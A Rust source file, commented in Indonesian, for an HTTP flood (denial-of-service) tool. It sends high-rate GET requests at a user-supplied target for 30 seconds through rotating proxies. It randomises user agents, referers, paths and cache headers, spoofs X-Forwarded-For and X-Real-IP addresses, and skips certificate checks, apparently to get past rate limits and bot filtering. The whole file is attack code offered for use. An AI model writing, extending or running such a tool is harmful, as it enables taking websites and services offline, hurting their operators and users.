mod lib;
use lib::{ConfigLists, pick_random, random_ip};
use std::{env, sync::Arc, time::{Duration, Instant}};
use reqwest::{Client, Proxy, header::HeaderMap};
use tokio::sync::Semaphore;
use futures::stream::{FuturesUnordered, StreamExt};

#[tokio::main]
async fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 5 {
        eprintln!("Usage: {} [rps] [threads] [proxies.txt] [target]", args[0]);
        std::process::exit(1);
    }
    let rps: usize = args[1].parse().expect("Invalid RPS");
    let threads: usize = args[2].parse().expect("Invalid thread count");
    let proxyfile = &args[3];
    let target = &args[4];
    let duration_sec = 30;

    // Load semua config eksternal
    let mut config = ConfigLists::load();
    config.proxies = Arc::new(lib::load_file(proxyfile)); // override dengan file argumen jika berbeda

    println!("Target: {target}\nRPS: {rps}, Threads: {threads}, Duration: {duration_sec}s");
    println!("Proxies: {}, Useragents: {}, Referers: {}, Paths: {}",
        config.proxies.len(), config.useragents.len(), config.referers.len(), config.paths.len()
    );

    let client_base = Arc::new(
        Client::builder()
            .pool_idle_timeout(Duration::from_secs(60))
            .danger_accept_invalid_certs(true)
            .tcp_nodelay(true)
            .build()
            .unwrap()
    );
    let semaphore = Arc::new(Semaphore::new(threads));
    let start = Instant::now();

    // Spawn threads
    let mut handles = Vec::with_capacity(threads);
    for _ in 0..threads {
        let config = ConfigLists {
            proxies: Arc::clone(&config.proxies),
            referers: Arc::clone(&config.referers),
            useragents: Arc::clone(&config.useragents),
            ciphers: Arc::clone(&config.ciphers),
            sigalgs: Arc::clone(&config.sigalgs),
            paths: Arc::clone(&config.paths),
            langs: Arc::clone(&config.langs),
            accepts: Arc::clone(&config.accepts),
            encodings: Arc::clone(&config.encodings),
            controles: Arc::clone(&config.controles),
        };
        let target = target.to_string();
        let client_base = Arc::clone(&client_base);
        let semaphore = Arc::clone(&semaphore);

        handles.push(tokio::spawn(async move {
            let _permit = semaphore.acquire().await.unwrap();
            let mut rng = rand::thread_rng();
            let rps_per_thread = rps / threads.max(1);

            while start.elapsed().as_secs() < duration_sec {
                let mut batch = FuturesUnordered::new();

                for _ in 0..rps_per_thread.max(1) {
                    // Pilih proxy / client
                    let client = if !config.proxies.is_empty() {
                        let proxy = pick_random(&config.proxies, "");
                        if !proxy.is_empty() {
                            Arc::new(
                                Client::builder()
                                    .danger_accept_invalid_certs(true)
                                    .proxy(Proxy::all(proxy).unwrap())
                                    .build()
                                    .unwrap()
                            )
                        } else { Arc::clone(&client_base) }
                    } else { Arc::clone(&client_base) };

                    // Randomisasi semua header
                    let path = pick_random(&config.paths, "/");
                    let url = format!("{}{}", target, path);
                    let user_agent = pick_random(&config.useragents, "Mozilla/5.0");
                    let referer = pick_random(&config.referers, "https://google.com");
                    let cipher = pick_random(&config.ciphers, "TLS_AES_128_GCM_SHA256");
                    let sigalg = pick_random(&config.sigalgs, "ecdsa_secp256r1_sha256");
                    let lang = pick_random(&config.langs, "en-US,en;q=0.5");
                    let accept = pick_random(&config.accepts, "*/*");
                    let encoding = pick_random(&config.encodings, "gzip, deflate, br");
                    let controle = pick_random(&config.controles, "no-cache");
                    let fake_ip = random_ip();

                    let mut headers = HeaderMap::new();
                    headers.insert("User-Agent", user_agent.parse().unwrap());
                    headers.insert("Referer", referer.parse().unwrap());
                    headers.insert("X-Forwarded-For", fake_ip.parse().unwrap());
                    headers.insert("X-Real-IP", fake_ip.parse().unwrap());
                    headers.insert("Accept", accept.parse().unwrap());
                    headers.insert("Accept-Encoding", encoding.parse().unwrap());
                    headers.insert("Accept-Language", lang.parse().unwrap());
                    headers.insert("Cache-Control", controle.parse().unwrap());
                    headers.insert("TLS-Cipher", cipher.parse().unwrap());
                    headers.insert("TLS-SigAlg", sigalg.parse().unwrap());

                    let req = client
                        .get(&url)
                        .headers(headers)
                        .timeout(Duration::from_secs(4));
                    batch.push(req.send());
                }
                let mut ok = 0;
                let mut fail = 0;
                while let Some(res) = batch.next().await {
                    match res {
                        Ok(_) => ok += 1,
                        Err(_) => fail += 1,
                    }
                }
                // Optional: log per batch (bisa dihapus jika tidak mau noisy)
                // println!("Batch done: OK: {}, Fail: {}", ok, fail);
            }
        }));
    }
    // Tunggu semua selesai
    for h in handles {
        let _ = h.await;
    }
    println!("SELESAI!");
}